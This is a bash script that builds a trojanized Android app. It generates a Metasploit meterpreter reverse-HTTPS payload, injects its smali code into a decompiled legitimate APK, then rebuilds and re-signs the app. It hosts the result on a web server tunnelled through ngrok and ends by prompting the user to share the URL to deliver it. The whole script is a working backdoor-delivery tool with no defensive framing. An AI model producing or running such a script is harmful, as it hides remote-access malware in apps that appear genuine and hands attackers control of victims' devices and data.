#!/bin/bash

# Variables - customize these
LHOST="your_ip_here"
LPORT="443"
ORIGINAL_APK="original.apk"
WORKDIR="workdir"
KEYSTORE="my-release-key.keystore"
ALIAS="myalias"
PASSWORD="your_keystore_password"
NGROK_PATH="/path/to/ngrok"  # Adjust if ngrok is in PATH

# Step 1: Generate malicious payload APK
echo "[*] Generating malicious payload APK..."
msfvenom -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT R > payload.apk

# Step 2: Decompile original APK
echo "[*] Decompiling original APK..."
apktool d -f $ORIGINAL_APK -o $WORKDIR/original

# Step 3: Decompile payload APK
echo "[*] Decompiling payload APK..."
apktool d -f payload.apk -o $WORKDIR/payload

# Step 4: Merge smali code
echo "[*] Merging payload smali into original..."
cp -r $WORKDIR/payload/smali/* $WORKDIR/original/smali/

# Step 5: Merge AndroidManifest permissions (manual step recommended)
echo "[*] Please manually merge permissions from payload AndroidManifest.xml into original."

# Step 6: Rebuild APK
echo "[*] Rebuilding APK..."
apktool b $WORKDIR/original -o $WORKDIR/modified.apk

# Step 7: Sign APK
echo "[*] Signing APK..."
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $KEYSTORE -storepass $PASSWORD $WORKDIR/modified.apk $ALIAS

# Optional: Align APK
echo "[*] Aligning APK..."
zipalign -v 4 $WORKDIR/modified.apk $WORKDIR/aligned_modified.apk

# Step 8: Start web server
echo "[*] Starting web server to host APK..."
cd $WORKDIR
python3 -m http.server 8080 &

# Step 9: Start ngrok
echo "[*] Starting ngrok tunnel..."
$NGROK_PATH http 8080 &

echo "[*] Done! Share the ngrok URL to deliver the APK."
